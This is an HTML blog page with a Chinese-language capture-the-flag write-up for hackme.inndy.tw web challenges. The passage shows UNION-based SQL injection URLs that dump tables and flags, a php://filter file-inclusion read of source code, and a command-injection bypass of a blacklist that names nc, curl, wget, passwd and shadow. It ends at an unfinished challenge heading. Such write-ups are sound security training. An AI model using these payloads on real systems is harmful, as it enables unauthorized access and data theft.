<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="wywwzjj">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="wywwzjj">
    
    <meta name="keywords" content="wywwzjj,wywwzjj blog,wywwzjj ctf,wywwzjj web security">
    
    <meta name="description" content>
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Hackme-Web-Writeup · wywwzjj&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/B.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/">wywwzjj&#39;s Blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">Hackme-Web-Writeup</a>
            </div>
    </div>
    
    <a class="home-link" href="/">wywwzjj's Blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            Hackme-Web-Writeup
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class="post-intro-tags">
    
        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">4.5k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2019/02/02</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hide and seek</a></h2><blockquote>
<p>Can you see me? I’m so close to you but you can’t see me.</p>
</blockquote>
<p>这题查看源码即可。</p>
<h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb" target="_blank" rel="noopener">guestbook</a></h2><blockquote>
<p>This guestbook sucks. <a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> is your friend. </p>
</blockquote>
<p>既然提示有 <code>sqlmap</code> ，或许可以一把梭。</p>
<p>先手注一波试试，发现没有任何过滤。</p>
<p>有四个字段，看一下<strong>显位</strong>。</p>
<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4</a></p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrbl15e9j20ls0aijrx.jpg" alt></p>
<p>都有明显回显，直接上吧，盲注太慢。</p>
<p><strong>拿到列名</strong></p>
<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</a></p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrl665y7j20ox0amq3k.jpg" alt></p>
<p><strong>查询所有数据</strong></p>
<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag</a></p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jvo2i9hmj20u50acaaw.jpg" alt></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a><a href="https://hackme.inndy.tw/lfi/" target="_blank" rel="noopener">LFI</a></h2><blockquote>
<p>What this admin’s password? That is not important at all, just get the flag. Tips: LFI, <code>php://filter</code></p>
</blockquote>
<p>用到 PHP 伪协议：<code>php://filter</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=pages/login</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到 login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'user'</span>] === <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'pass'</span>]) === <span class="string">'bed128365216c019988915ed3add75fb'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"?page=pages/login"</span> method=<span class="string">"post"</span> role=<span class="string">"form"</span>&gt;</span><br><span class="line">    &lt;div class="form-group"&gt;</span><br><span class="line">    	&lt;label <span class="keyword">for</span>=<span class="string">"user-i"</span>&gt;User&lt;/label&gt;</span><br><span class="line">    	&lt;input type="text" class="form-control" id="user-i" placeholder="Username" name="user"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="form-group"&gt;</span><br><span class="line">    	&lt;label <span class="keyword">for</span>=<span class="string">"pass-i"</span>&gt;Password&lt;/label&gt;</span><br><span class="line">    	&lt;input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 再看下 config.php，拿到 flag</span></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_xsXSYP......&#125;"</span>;</span><br></pre></td></tr></table></figure>

<h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">homepage</a></h2><blockquote>
<p>Where is the flag? Did you check the code? </p>
</blockquote>
<p>提示查看源代码，发现了一个特别的 <code>cute.js</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">嚝从㚁����= <span class="regexp">/嚚�嚚榅湛�㚁�� ~�𤫇���𤫇   /</span><span class="comment">/*織����*/</span> [<span class="string">'_'</span>]; o=(嚝�蔑嚝�)  =_=<span class="number">3</span>; c=(嚝巵矋��) =(嚝�蔑嚝�)-(嚝�蔑嚝�); (嚝氱䈑��) =(嚝巵矋��)= (o^_^o)/ (o^_^o);(嚝氱䈑��)=&#123;嚝巵矋��: <span class="string">'_'</span> ,嚝从㚁���� : ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝巵矋�篏 ,嚝�蔑嚝��� :(嚝从㚁����+ <span class="string">'_'</span>)[o^_^o -(嚝巵矋��)] ,嚝氱䈑����:((嚝�蔑嚝�==<span class="number">3</span>) +<span class="string">'_'</span>)[嚝�蔑嚝篏 &#125;; (嚝氱䈑��) [嚝巵矋�篏 =((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [c^_^o];(嚝氱䈑��) [<span class="string">'c'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [ (嚝�蔑嚝�)+(嚝�蔑嚝�)-(嚝巵矋��) ];(嚝氱䈑��) [<span class="string">'o'</span>] = ((嚝氱䈑��)+<span class="string">'_'</span>) [嚝巵矋�篏;(嚝剠嚝�)=(嚝氱䈑��) [<span class="string">'c'</span>]+(嚝氱䈑��) [<span class="string">'o'</span>]+(嚝从㚁���� +<span class="string">'_'</span>)[嚝巵矋�篏+ ((嚝从㚁����==<span class="number">3</span>) +<span class="string">'_'</span>) [嚝�蔑嚝篏 + ((嚝氱.......</span><br></pre></td></tr></table></figure>

<p>别的师傅说是 <code>aaencode</code> 加密，我有点懵逼，以后再弄吧，这种题不值得多花时间。</p>
<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><a href="https://hackme.inndy.tw/ping/" target="_blank" rel="noopener">ping</a></h2><blockquote>
<p>Can you ping 127.0.0.1?</p>
</blockquote>
<p>看来是源码审计的题目，命令注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;&lt;?php</span><br><span class="line">        $blacklist = [</span><br><span class="line">            &apos;flag&apos;, &apos;cat&apos;, &apos;nc&apos;, &apos;sh&apos;, &apos;cp&apos;, &apos;touch&apos;, &apos;mv&apos;, &apos;rm&apos;, &apos;ps&apos;, &apos;top&apos;, &apos;sleep&apos;, &apos;sed&apos;,</span><br><span class="line">            &apos;apt&apos;, &apos;yum&apos;, &apos;curl&apos;, &apos;wget&apos;, &apos;perl&apos;, &apos;python&apos;, &apos;zip&apos;, &apos;tar&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;kill&apos;,</span><br><span class="line">            &apos;passwd&apos;, &apos;shadow&apos;, &apos;root&apos;,</span><br><span class="line">            &apos;z&apos;,</span><br><span class="line">            &apos;dir&apos;, &apos;dd&apos;, &apos;df&apos;, &apos;du&apos;, &apos;free&apos;, &apos;tempfile&apos;, &apos;touch&apos;, &apos;tee&apos;, &apos;sha&apos;, &apos;x64&apos;, &apos;g&apos;,</span><br><span class="line">            &apos;xargs&apos;, &apos;PATH&apos;,</span><br><span class="line">            &apos;$0&apos;, &apos;proc&apos;,</span><br><span class="line">            &apos;/&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&gt;&apos;, &apos;&lt;&apos;, &apos;;&apos;, &apos;&quot;&apos;, &apos;\&apos;&apos;, &apos;\\&apos;, &quot;\n&quot;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &apos;IP toooooo longgggggggggg&apos;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&apos;ip&apos;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&apos;ip&apos;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>发现 <code>$</code> 没有在黑名单内，还可以 ``</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(ls) / `ls`</span></span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat 被过滤了，但有一堆可以查看文件内容的命令啊</span></span><br><span class="line">tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！ </span><br><span class="line">more 一页一页的显示档案内容 </span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ </span><br><span class="line">head 只看头几行 </span><br><span class="line">tail 只看尾巴几行 </span><br><span class="line">nl   显示的时候，顺道输出行号！</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加个 * 模糊匹配一下</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(tac f*)</span></span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure>

<h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a href="https://hackme.inndy.tw/scoreboard" target="_blank" rel="noopener">scoreboard</a></h2><blockquote>
<p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don’t need to do that.</p>
</blockquote>
<p><code>header</code> 里发现了 <code>x-flag</code>。</p>
<h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0</a></h2><blockquote>
<p>SQL Injection!</p>
</blockquote>
<p>题目直接给了源码，开始审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">    <span class="comment">// \' =&gt; \\'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($user === <span class="keyword">false</span>): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;!-- debug: <span class="meta">&lt;?</span>=$sql<span class="meta">?&gt;</span> --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user-&gt;is_admin ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user-&gt;is_admin) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;, %s"</span>, htmlentities($flag1), $where_is_flag2); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 <code>DB_HOST</code> 这些参数还在想有没变量覆盖的洞，或许可连接自己的数据库， <code>safe_filter</code> 这并不能这样玩。</p>
<p>提示都说了是注入，还是老老实实 <code>sqli</code> 吧，简单的处理了一下 <code>POST</code> 数组，但是并不严格。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str_replace(&quot;&apos;&quot;, &quot;\\&apos;&quot;, $str);</span><br><span class="line">\&apos; =&gt; \\&apos; 即可绕过</span><br></pre></td></tr></table></figure>

<p>既然加了 <code>or 1</code> ，正常就显示第一条，并不会只查 <code>admin</code> 用户，所以需要手动调下，否则看不到 <code>flag</code> 的噢。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kd6ju1zgj20y60gkmz6.jpg" alt></p>
<p><code>name=666&amp;password=\&#39; union select 1,1,1,1#</code> 直接就有了。</p>
<h2 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0.1</a></h2><blockquote>
<p>Grab the hidden flag</p>
</blockquote>
<p>从上一题中可以看到：flag2 in the database!  另外注意到有回显位，就不需要盲注了，然后就是常规套路了。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdmo441pj20yq0j3gnt.jpg" alt></p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2kdoudznmj20yp0j8ac9.jpg" alt></p>
<p><img src="C:%5CUsers%5Cwywwzjj%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1556585961992.png" alt="1556585961992"></p>
<h2 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1</a></h2><blockquote>
<p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br><strong>Scanner WON’T WORK</strong></p>
</blockquote>
<p>这题同样给了源码，与上一题大同小异，过滤稍微多点吧。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//require('WAF.php');</span></span><br><span class="line"></span><br><span class="line">$ua = strtolower($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($bad_ua <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr($ua, $bad)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"I don't like hackers. :("</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br></pre></td></tr></table></figure>

<p>空格被过滤了，方法很多，这里以<code>/**/</code> 代替，然后故技重施。</p>
<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2ke4fuj97j20yp0j340n.jpg" alt></p>
<h2 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a><a href="https://hackme.inndy.tw/login1" target="_blank" rel="noopener">login as admin 1.2</a></h2><blockquote>
